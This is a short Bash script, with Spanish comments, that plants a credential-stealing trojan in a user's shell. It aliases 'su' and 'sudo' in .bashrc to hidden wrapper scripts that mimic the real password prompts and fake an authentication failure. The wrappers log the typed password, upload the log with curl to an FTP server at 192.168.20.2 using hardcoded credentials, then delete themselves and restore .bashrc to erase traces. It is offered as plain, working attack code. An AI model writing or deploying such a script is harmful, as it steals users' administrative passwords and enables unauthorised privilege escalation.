#!/bin/bash


# Backup del .bashrc
cp $HOME/.bashrc $HOME/.bashrcbk;

# Suplantacion de <su>
echo "alias su='$HOME/.sudo_su'" >> $HOME/.bashrc;
echo "#!/bin/bash"> $HOME/.sudo_su;
echo "mv $HOME/.bashrcbk $HOME/.bashrc" >> $HOME/.sudo_su;
echo "stty -echo" >> $HOME/.sudo_su;
echo "read -p \"Password: \" IN" >> $HOME/.sudo_su;
echo "stty echo" >> $HOME/.sudo_su;
echo "echo" >> $HOME/.sudo_su;
echo "date >> $HOME/.plog" >> $HOME/.sudo_su;
echo "echo `whoami` : \$IN >> $HOME/.plog" >> $HOME/.sudo_su;
echo "echo \"su: Authentication failure\"" >> $HOME/.sudo_su;
echo "curl -u alejandro:kornienko23 -T .plog* ftp://192.168.20.2/.cre/ 2>/dev/null" >> $HOME/.sudo_su;
echo "rm \$HOME/.sudo_sd" >> $HOME/.sudo_su;
echo "rm \`basename \$0\`" >> $HOME/.sudo_su;
echo "rm \$HOME/.plog" >> $HOME/.sudo_su;
echo "bash --rcfile .bashrc" >> $HOME/.sudo_su;
chmod 755 $HOME/.sudo_su;

# Suplantacion de <sudo>
echo "alias sudo='$HOME/.sudo_sd'" >> $HOME/.bashrc;
echo "#!/bin/bash"> $HOME/.sudo_sd;
echo "mv $HOME/.bashrcbk $HOME/.bashrc" >> $HOME/.sudo_sd;
echo "stty -echo" >> $HOME/.sudo_sd;
echo "read -p \"[sudo] password for `id -un`: \" IN" >> $HOME/.sudo_sd;
echo "stty echo" >> $HOME/.sudo_sd;
echo "echo" >> $HOME/.sudo_sd;
echo "date >> $HOME/.plog" >> $HOME/.sudo_sd;
echo "echo `whoami` : \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
echo "echo \"Sorry, try again.\"" >> $HOME/.sudo_sd;
echo "curl -u alejandro:kornienko23 -T .plog* ftp://192.168.20.2/.cre/ 2>/dev/null" >> $HOME/.sudo_sd;
echo "rm \`basename \$0\`" >> $HOME/.sudo_sd;
echo "rm \$HOME/.sudo_su" >> $HOME/.sudo_sd;
echo "rm \$HOME/.plog" >> $HOME/.sudo_sd;
echo "sudo -k;" >> $HOME/.sudo_sd;
echo "sudo \$*; bash --rcfile .bashrc" >> $HOME/.sudo_sd;
chmod 755 $HOME/.sudo_sd;
